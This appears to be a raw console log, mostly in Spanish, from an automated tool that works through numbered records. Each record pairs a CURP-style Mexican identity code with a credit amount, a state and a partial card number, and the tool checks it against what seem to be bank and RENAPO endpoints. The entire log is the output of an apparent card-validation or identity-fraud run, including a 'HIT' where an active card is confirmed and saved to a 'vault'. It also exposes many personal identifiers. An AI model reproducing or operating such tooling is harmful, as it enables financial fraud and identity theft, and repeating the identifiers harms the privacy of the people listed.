[2078] ID:4886220 | PEAI701129MGRRLG04 | $179,000 | GUERRERO | T:6231... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (17.6s)
[2079] ID:1884069 | LATL691222HTSVVS09 | $178,990 | TAMAULIPAS | T:0023... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.7s)
[2080] ID:4673429 | VIJO700112HJCLRS07 | $178,980 | JALISCO | T:4774... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2081] ID:3681675 | VELJ740423HVRLRR05 | $178,890 | VERACRUZ | T:5266... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[2082] ID:1769561 | GAIC711124HJCRNR07 | $178,840 | JALISCO | T:2566... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.8s)
[2083] ID:4295587 | MAGD740731HNLTRN03 | $178,810 | NUEVO LEON | T:3494... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[2084] ID:2307624 | MEMG691020HMCDRR08 | $178,800 | ESTADO DE ME | T:2064... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.0s)
[2085] ID:4595710 | GOPM690801HCHNNN05 | $178,800 | CHIHUAHUA | T:4421... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2086] ID:3708062 | EIEG690428HQRVSB09 | $178,760 | QUINTANA ROO | T:1225... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2087] ID:202462 | BICK731104MQRRBR07 | $178,750 | QUINTANA ROO | T:2282... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[2088] ID:4057585 | LUML741107HNLNYS07 | $178,750 | NUEVO LEON | T:2632... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[2089] ID:284784 | ROMC690409MJCMRL07 | $178,740 | JALISCO | T:4229... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.5s)
[2090] ID:2993170 | BABX710109HQTRBL01 | $178,740 | QUERETARO | T:3332... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2632 para ID:4057585 ($178,750)... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.7s)
[2091] ID:2517356 | AUOR730414MSOCJM05 | $178,710 | SONORA | T:0415... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2092] ID:4324815 | TIRP690707MQTRSR00 | $178,700 | QUERETARO | T:4415... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[⚠️ RETRY] Excepción red: Failed to perform, curl: (28) Operation timed out after 6008 (12.3s)
[2093] ID:2421946 | VAJL721004HMNRNS06 | $178,670 | MICHOACAN | T:7943... [2094] ID:1953529 | HECA750704HYCRSL06 | $178,660 | YUCATAN | T:9853... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2095] ID:3179238 | OILF700326HBCRPR05 | $178,600 | BAJA CALIFOR | T:6552... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2096] ID:3347826 | PACT720604MVZLRR07 | $178,560 | VERACRUZ | T:1744... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.8s)
[2097] ID:3226810 | LUML741107HNLNYS07 | $178,540 | NUEVO LEON | T:4250... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.9s)
[2098] ID:171926 | GAAR720322HJCRNL01 | $178,500 | JALISCO | T:4853... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[2099] ID:1811089 | MASP710317MNLRNT08 | $178,500 | NUEVO LEON | T:5387... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.5s)
[2100] ID:2632483 | AAGS691207MGTNTN09 | $178,500 | GUANAJUATO | T:1977... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4853 para ID:171926 ($178,500)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2101] ID:2951634 | FIGR801025HNLRNC08 | $178,500 | NUEVO LEON | T:5966... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.8s)
[2102] ID:3907416 | CAHA730602MDFMDD03 | $178,500 | CIUDAD DE ME | T:1383... [🟢 HIT #12] Tarjeta ACTIVA Confirmada -> Guardado en bóveda!

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5387 para ID:1811089 ($178,500)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.9s)
[2103] ID:4603419 | GORR691027HDFNZD08 | $178,500 | CIUDAD DE ME | T:6644... [🔴 OFF] Contacto preexistente (/confirm-contact) (18.2s)
[2104] ID:4769671 | SABF720205HDFFVD07 | $178,500 | CIUDAD DE ME | T:1299... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2105] ID:1120703 | AIHR711219HVRRRF01 | $178,480 | VERACRUZ | T:3760... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1383 para ID:3907416 ($178,500)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2106] ID:2838482 | AECA740131HNLBRR06 | $178,480 | NUEVO LEON | T:1786... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.9s)
[2107] ID:66330 | VALH710502MQRLLL04 | $178,470 | QUINTANA ROO | T:8864... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[2108] ID:88300 | EABJ751215HMCSRN07 | $178,470 | ESTADO DE ME | T:5013... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.7s)
[2109] ID:2494381 | HARR740116HNLMLG06 | $178,470 | NUEVO LEON | T:8948... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1786 para ID:2838482 ($178,480)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2110] ID:1119790 | COBA710412HDFLCN01 | $178,430 | CIUDAD DE ME | T:8931... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.7s)
[2111] ID:1226449 | CUJH690616HMCRMC01 | $178,430 | ESTADO DE ME | T:8992... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2112] ID:892175 | MUMG750703HVRNNB00 | $178,410 | VERACRUZ | T:1819... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[2113] ID:1466093 | RODJ711212MCMJLD05 | $178,400 | COLIMA | T:5884... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.2s)
[2114] ID:2879411 | GOCT700825HNLNSM04 | $178,380 | NUEVO LEON | T:1188... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[2115] ID:2918721 | RIRS690325HNLNCM06 | $178,380 | NUEVO LEON | T:8461... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.1s)
[2116] ID:776726 | SICM700904MNLLRR03 | $178,370 | NUEVO LEON | T:0019... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2117] ID:2731798 | DIMP701005HDFZNL01 | $178,360 | CIUDAD DE ME | T:5059... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.9s)
[2118] ID:2878227 | BICK731104MQRRBR07 | $178,350 | QUINTANA ROO | T:2055... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8461 para ID:2918721 ($178,380)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2119] ID:3636671 | MAMA711123HOCRRL03 | $178,350 | OAXACA | T:8439... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.2s)
[2120] ID:3371047 | CUCE700706MGRRHL09 | $178,340 | GUERRERO | T:7803... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5059 para ID:2731798 ($178,360)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.0s)
[2121] ID:2111638 | ORHN720125MNLRRR08 | $178,290 | NUEVO LEON | T:9094... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.6s)
[2122] ID:178656 | RAGI690727HDFMNG02 | $178,260 | CIUDAD DE ME | T:5829... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2123] ID:288878 | CACM750612MCMRRR07 | $178,200 | COLIMA | T:0320... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (12.0s)
[2124] ID:303981 | GAVR721029HNLRLB03 | $178,200 | NUEVO LEON | T:6101... [🔴 OFF] Rechazo bancario (PE170) (16.0s)
[2125] ID:1005409 | GOML701005HDFNNS04 | $178,200 | CIUDAD DE ME | T:4439... [🔴 OFF] Rechazo bancario (PE150) (16.2s)
[2126] ID:1769585 | VEGL720512HNLLRZ00 | $178,200 | NUEVO LEON | T:9975... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.9s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4439 para ID:1005409 ($178,200)... [2127] ID:1802003 | SEGC701116MMCTLL00 | $178,200 | ESTADO DE ME | T:1833... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.1s)
[2128] ID:2410808 | CEEE690513HASRSR09 | $178,200 | AGUASCALIENT | T:9176... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE170) (16.1s)
[2129] ID:2633193 | CAVV710419MNLSGR00 | $178,200 | NUEVO LEON | T:8293... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.8s)
[2130] ID:3608051 | SASP700317MTSNNT03 | $178,200 | TAMAULIPAS | T:9551... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.6s)
[2131] ID:4169881 | TOJU691201HMCLRN04 | $178,200 | ESTADO DE ME | T:6511... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.7s)
[2132] ID:374554 | LEON690516HHGYSX05 | $178,160 | HIDALGO | T:8950... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9551 para ID:3608051 ($178,200)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2133] ID:194473 | ROUA740715HDFBRN00 | $178,120 | CIUDAD DE ME | T:9789... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE170) (13.8s)
[2134] ID:2422402 | EIOE730104HGTNLD02 | $178,100 | GUANAJUATO | T:3295... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.9s)
[2135] ID:3033234 | ROVM700930HMCJGG03 | $178,090 | ESTADO DE ME | T:5674... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.3s)
[2136] ID:840061 | GUVM721222HBCZZR04 | $178,080 | BAJA CALIFOR | T:5448... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.8s)
[2137] ID:1565057 | LOQG730825HCHZNS04 | $178,080 | CHIHUAHUA | T:1130... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2138] ID:4850073 | GASB701008MGRBLT06 | $178,080 | GUERRERO | T:8664... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.5s)
[2139] ID:38921 | SEVG760204HJCPZL06 | $178,000 | JALISCO | T:4161... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.9s)
[2140] ID:246099 | RELP701019HSOYQD00 | $178,000 | SINALOA | T:9878... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2141] ID:350055 | FOVS750528HMCLCM07 | $178,000 | ESTADO DE ME | T:8147... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (12.3s)
[2142] ID:508204 | LORM700430MDFZMR08 | $178,000 | CIUDAD DE ME | T:8792... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2143] ID:543469 | MAVC731223HOCLZR08 | $178,000 | OAXACA | T:2119... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2144] ID:572210 | FEGL740525HBCLNS02 | $178,000 | BAJA CALIFOR | T:8164... [🔴 OFF] Rechazo bancario (PE170) (14.9s)
[2145] ID:1062131 | GORA720726MDFNDN01 | $178,000 | CIUDAD DE ME | T:4741... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.2s)
[2146] ID:1062986 | CIMJ700114HASSRN00 | $178,000 | AGUASCALIENT | T:5668... [🔴 OFF] Rechazo bancario (PE160) (10.0s)
[2147] ID:1106434 | TEBO710702HMCRRS04 | $178,000 | ESTADO DE ME | T:5792... [🔴 OFF] Rechazo bancario (PE1002) (13.2s)
[2148] ID:1172982 | OOGE761015HMCRRD03 | $178,000 | ESTADO DE ME | T:1578... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.3s)
[2149] ID:1681042 | GURJ700724HJCLMV01 | $178,000 | JALISCO | T:4418... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[2150] ID:1845579 | JIGN700719MMNMRR01 | $178,000 | MICHOACAN | T:7961... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2151] ID:2896945 | MAGL700707MQRGNR06 | $178,000 | QUINTANA ROO | T:5467... [🔴 OFF] Rechazo bancario (PE110) (12.3s)
[2152] ID:3087859 | AAVF700623HASNRR01 | $178,000 | AGUASCALIENT | T:0727... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.3s)
[2153] ID:3161722 | MAGJ690217HDFRRS01 | $178,000 | CIUDAD DE ME | T:7242... [🔴 OFF] Contacto preexistente (/confirm-contact) (19.2s)
[2154] ID:3547843 | CAZR800906HMCSRD05 | $178,000 | ESTADO DE ME | T:2730... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[2155] ID:3656212 | AAVF700623HASNRR01 | $178,000 | AGUASCALIENT | T:1834... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.1s)
[2156] ID:3739768 | EAJF691119HSOSMR08 | $178,000 | SONORA | T:1605... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7242 para ID:3161722 ($178,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[2157] ID:3884523 | QURJ711113HNLNMN08 | $178,000 | NUEVO LEON | T:7490... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.0s)
[2158] ID:4005784 | FOAA701214HASLRL07 | $178,000 | AGUASCALIENT | T:1986... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.7s)
[2159] ID:4045166 | MACM691212HTSRNN08 | $178,000 | TAMAULIPAS | T:2433... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[2160] ID:4115289 | CARK700811MNLHNR07 | $178,000 | NUEVO LEON | T:8767... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[🔴 OFF] Contacto preexistente (/confirm-contact) (13.8s)

[+] Lote de 500 candidatos precargados con límite >= $50,000 (1969+)
[2161] ID:4157940 | ROAR731106HNLDVB08 | $178,000 | NUEVO LEON | T:1282... [2162] ID:4265565 | JITI690903MTSMML04 | $178,000 | TAMAULIPAS | T:8547... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2163] ID:4498711 | MOAO710119HNLNNS04 | $178,000 | NUEVO LEON | T:3353... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.1s)
[2164] ID:4571986 | REPA701121HJCTRL06 | $178,000 | JALISCO | T:6097... [🔴 OFF] Rechazo bancario (PE1002) (12.1s)
[2165] ID:4572584 | LECO710528HDFZLV02 | $178,000 | CIUDAD DE ME | T:9832... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.2s)
[2166] ID:4577055 | MIOH750808HCGRRC06 | $178,000 | COAHUILA | T:8177... [🔴 OFF] Rechazo bancario (PE1002) (13.2s)
[2167] ID:4731567 | LORM700430MDFZMR08 | $178,000 | CIUDAD DE ME | T:2333... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.2s)
[2168] ID:4737035 | AUAJ731103HQTGLS05 | $178,000 | QUERETARO | T:0501... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.8s)
[2169] ID:4807758 | CEME711221HSOBRD05 | $178,000 | SINALOA | T:2985... [🔴 OFF] Rechazo bancario (PE170) (16.1s)
[2170] ID:1507145 | DAPF771021HNLVRR06 | $177,970 | NUEVO LEON | T:5102... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2171] ID:4789707 | JIRB690213HNLMVN09 | $177,960 | NUEVO LEON | T:5474... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[2172] ID:1702643 | AIMM750605HJCRRR01 | $177,880 | JALISCO | T:8146... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.3s)
[2173] ID:2353878 | VILM741225MSRLPR03 | $177,840 | SONORA | T:6674... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.2s)
[2174] ID:4266210 | GAHJ690830HMCRRN03 | $177,840 | ESTADO DE ME | T:1249... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.6s)
[2175] ID:2325223 | MAMR711129HMNDNM06 | $177,810 | MICHOACAN | T:7671... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6674 para ID:2353878 ($177,840)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.0s)
[2176] ID:196296 | CARA700927HGTSML02 | $177,800 | GUANAJUATO | T:4108... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.8s)
[2177] ID:1013492 | RACA750602HMCMHL04 | $177,800 | ESTADO DE ME | T:8473... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2178] ID:1366898 | TICR700313HDFNRM04 | $177,800 | CIUDAD DE ME | T:5549... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (3.8s)
[2179] ID:169412 | GAMD750215MNLLRN06 | $177,750 | NUEVO LEON | T:5319... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1249 para ID:4266210 ($177,840)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (14.8s)
[2180] ID:4864090 | GAGC730302HQRLTS03 | $177,740 | QUINTANA ROO | T:0345... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.9s)
[2181] ID:181986 | PEFA730501MDFRLN03 | $177,710 | CIUDAD DE ME | T:3242... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.0s)
[2182] ID:2997474 | BOWL761204HNLJLS09 | $177,700 | NUEVO LEON | T:9557... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.1s)
[2183] ID:2119119 | SABA751214HMCNSN07 | $177,690 | ESTADO DE ME | T:4429... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3242 para ID:181986 ($177,710)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.2s)
[🔴 OFF] Contacto preexistente (/confirm-contact) (13.3s)
[2184] ID:969684 | ROFP740615HJCDTD05 | $177,680 | JALISCO | T:7574... [2185] ID:4252006 | AARL710427HJCLBP01 | $177,660 | JALISCO | T:2579... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[2186] ID:4642361 | FACE720418HDFRLD08 | $177,630 | CIUDAD DE ME | T:4882... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[2187] ID:900899 | PIFM700817HMCRLR07 | $177,600 | ESTADO DE ME | T:1207... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2188] ID:3649324 | HERM780216HJCRJR09 | $177,600 | JALISCO | T:0744... [🔴 OFF] Rechazo bancario (PE110) (14.3s)
[2189] ID:4809293 | HEPS710306MDFRNS01 | $177,600 | CIUDAD DE ME | T:6882... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.2s)
[2190] ID:4507707 | HERM730524HDFRDR07 | $177,580 | CIUDAD DE ME | T:4225... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.5s)
[2191] ID:42435 | GURS720330MMCTJN08 | $177,550 | ESTADO DE ME | T:6528... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.7s)
[2192] ID:347917 | GOVT790324MJCMLS09 | $177,530 | JALISCO | T:9761... [2193] ID:1124931 | MIRP690718HJCRBB02 | $177,520 | JALISCO | T:9028... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4225 para ID:4507707 ($177,580)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2194] ID:750181 | MEOC701021HDFRRR04 | $177,500 | CIUDAD DE ME | T:2936... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[2195] ID:1618747 | PAVA700511MJCDLN09 | $177,500 | JALISCO | T:2164... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (12.4s)
[2196] ID:1993748 | ZAGS690326HTSVZL06 | $177,500 | TAMAULIPAS | T:0811... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[2197] ID:207805 | MURJ690512HJCRVN02 | $177,490 | JALISCO | T:5213... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.9s)
[2198] ID:4064469 | RISL690816MDGVNL00 | $177,480 | DURANGO | T:2975... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0811 para ID:1993748 ($177,500)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.4s)
[2199] ID:1996703 | RETA000101MDFSVXA6 | $177,460 | CIUDAD DE ME | T:5797... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (12.6s)
[2200] ID:2615420 | GEOG720209HNLRRR08 | $177,430 | NUEVO LEON | T:7799... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (10.4s)
[2201] ID:2681090 | HAHE731212HMCMFL08 | $177,430 | ESTADO DE ME | T:9330... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2202] ID:3528891 | JIGN700719MMNMRR01 | $177,420 | MICHOACAN | T:3623... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.4s)
[2203] ID:1962567 | ROSM690905MDFCTR01 | $177,390 | CIUDAD DE ME | T:5724... [2204] ID:3188921 | JIGN700719MMNMRR01 | $177,390 | MICHOACAN | T:5771... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.0s)
[2205] ID:4333131 | CAMG720315MDFNRL03 | $177,380 | CIUDAD DE ME | T:2891... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.7s)
[2206] ID:1088519 | PEOM700414HQTRRG01 | $177,350 | QUERETARO | T:6596... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.9s)
[2207] ID:4483872 | JAVJ720523HJCRZS03 | $177,330 | JALISCO | T:4917... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (12.0s)
[2208] ID:807532 | LOLM700303MCHRPR03 | $177,320 | CHIHUAHUA | T:8326... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.7s)
[2209] ID:4058287 | GURA720121HSOZYM08 | $177,300 | SINALOA | T:6995... [🔴 OFF] Rechazo bancario (PE170) (13.7s)
[2210] ID:89845 | SIGU010101HGTMRLA5 | $177,260 | GUANAJUATO | T:2387... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2211] ID:1388104 | SASA690424HGTNNL05 | $177,250 | GUANAJUATO | T:5006... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[2212] ID:4290073 | AUAJ690922HDFGLR05 | $177,210 | CIUDAD DE ME | T:3073... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.6s)
[2213] ID:2423761 | ROGJ690710HJCDNN05 | $177,200 | JALISCO | T:8151... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.8s)
[2214] ID:123871 | CAFJ701203HJCHLL07 | $177,190 | JALISCO | T:4454... [🔴 OFF] Rechazo bancario (PE160) (11.7s)
[2215] ID:3833839 | RACR700305HGTMSD05 | $177,170 | GUANAJUATO | T:4438... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.6s)
[2216] ID:3671516 | CADJ700121HNLRZS09 | $177,150 | NUEVO LEON | T:6273... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.8s)
[2217] ID:885440 | DOLV770711HMCMMC04 | $177,120 | ESTADO DE ME | T:1299... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2218] ID:4682236 | FEGT830508HVRRMD03 | $177,100 | VERACRUZ | T:2883... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.3s)
[2219] ID:1564609 | GOLF740506MCSMZL06 | $177,080 | CHIAPAS | T:9596... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[2220] ID:147233 | AEGD730409HDFDMV03 | $177,070 | CIUDAD DE ME | T:2714... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (9.8s)
[2221] ID:4319847 | BAHD770725HMCRRM04 | $177,070 | ESTADO DE ME | T:7713... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[2222] ID:1415915 | PEAL691120HDFRTS01 | $177,040 | CIUDAD DE ME | T:7453... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.3s)
[2223] ID:2643014 | PEAR770715HDFRBM06 | $177,040 | CIUDAD DE ME | T:7565... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2714 para ID:147233 ($177,070)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.5s)
[2224] ID:4861854 | AASL741014HMSLNS05 | $177,040 | MORELOS | T:7136... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.0s)
[2225] ID:3211267 | TOMM710509HCPRRN09 | $177,030 | CAMPECHE | T:6053... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2226] ID:20940 | BODO700416HOCHZS09 | $177,000 | OAXACA | T:6330... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[2227] ID:187266 | CONR690214HJCRRC03 | $177,000 | JALISCO | T:9342... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.3s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6330 para ID:20940 ($177,000)... [2228] ID:548255 | VADF740330HJCLVR00 | $177,000 | JALISCO | T:1486... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.5s)
[2229] ID:556292 | PAGW770112MJCDRN06 | $177,000 | TONALA | T:8759... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2230] ID:635654 | OOGC730513HJCCDS00 | $177,000 | JALISCO | T:2266... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.7s)
[2231] ID:1142305 | PANC700430MDFZVL04 | $177,000 | CIUDAD DE ME | T:2835... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9342 para ID:187266 ($177,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.1s)
[2232] ID:1261536 | SAGV791111HGTNTC06 | $177,000 | GUANAJUATO | T:5472... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
